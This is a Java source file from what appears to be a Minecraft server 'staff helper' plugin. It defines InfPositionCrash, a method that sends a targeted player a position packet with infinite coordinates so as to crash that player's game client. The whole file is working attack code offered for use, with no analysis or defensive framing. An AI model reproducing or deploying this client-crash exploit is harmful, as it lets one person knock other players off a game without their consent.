package dev.xnlawa.staffhelper.crash.impl;

import com.github.retrooper.packetevents.PacketEvents;
import com.github.retrooper.packetevents.util.Vector3d;
import com.github.retrooper.packetevents.wrapper.play.server.WrapperPlayServerEntityTeleport;
import com.github.retrooper.packetevents.wrapper.play.server.WrapperPlayServerPlayerPositionAndLook;
import dev.xnlawa.staffhelper.crash.Crash;
import dev.xnlawa.staffhelper.crash.CrashMethod;
import org.bukkit.entity.Player;

public class InfPositionCrash extends Crash {
    public InfPositionCrash() {
        super(CrashMethod.INFPOSITION);
    }

    @Override
    public void performCrash(Player player) {
        Vector3d pos = new Vector3d(Double.POSITIVE_INFINITY, Double.POSITIVE_INFINITY, Double.POSITIVE_INFINITY);
        WrapperPlayServerPlayerPositionAndLook packet = new WrapperPlayServerPlayerPositionAndLook(
                pos,
                0f, 0f,
                (byte) 0,0
        );
        PacketEvents.getAPI().getPlayerManager().sendPacket(player, packet);
    }
}
